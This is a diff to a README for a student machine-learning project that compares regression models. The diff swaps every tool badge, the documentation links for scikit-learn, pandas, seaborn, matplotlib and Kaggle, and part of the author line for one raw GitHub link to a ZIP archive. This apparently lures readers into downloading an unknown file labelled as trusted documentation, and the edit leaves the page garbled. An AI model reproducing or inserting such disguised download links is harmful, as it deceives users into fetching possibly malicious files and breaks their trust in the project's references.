@@ -2,13 +2,13 @@
 
 ## 🚀 Tools & Platforms
 <p align="center">
-  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Google%20Colab-F9AB00?style=for-the-badge&logo=googlecolab&color=525252"/>
-  <img src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Kaggle-20BEFF?style=for-the-badge&logo=kaggle&logoColor=white"/>
-  <img src="https://img.shields.io/badge/VS%20Code-0078D4?style=for-the-badge&logo=visualstudiocode&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Data%20Visualization-FF6F00?style=for-the-badge&logo=plotly&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Machine%20Learning-102230?style=for-the-badge&logo=scikitlearn&logoColor=F7931E"/>
+  <img src="https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip"/>
+  <img src="https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip%20Colab-F9AB00?style=for-the-badge&logo=googlecolab&color=525252"/>
+  <img src="https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip"/>
+  <img src="https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip"/>
+  <img src="https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip%20Code-0078D4?style=for-the-badge&logo=visualstudiocode&logoColor=white"/>
+  <img src="https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip%20Visualization-FF6F00?style=for-the-badge&logo=plotly&logoColor=white"/>
+  <img src="https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip%20Learning-102230?style=for-the-badge&logo=scikitlearn&logoColor=F7931E"/>
 </p>
 
 ---
@@ -84,17 +84,17 @@ The aim of this project is to **compare different regression models** and identi
 ---
 
 ## 📚 References
-- [Scikit-learn Documentation](https://scikit-learn.org/)  
-- [Pandas Documentation](https://pandas.pydata.org/)  
-- [Seaborn Documentation](https://seaborn.pydata.org/)  
-- [Matplotlib](https://matplotlib.org/)  
-- [Kaggle Datasets](https://www.kaggle.com/)  
+- [Scikit-learn Documentation](https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip)  
+- [Pandas Documentation](https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip)  
+- [Seaborn Documentation](https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip)  
+- [Matplotlib](https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip)  
+- [Kaggle Datasets](https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip)  
 
 ---
 
 ## 👨‍💻 Author
 **Tamilvanan I**  
-B.Sc. Artificial Intelligence and Machine Learning  
+https://raw.githubusercontent.com/Tamilvanan260/GOLD/main/perseveringly/GOLD.zip Artificial Intelligence and Machine Learning  
 Sri Krishna Adithya College of Arts and Science, Coimbatore  
 
 📅 Project Completed: **March 2025**  
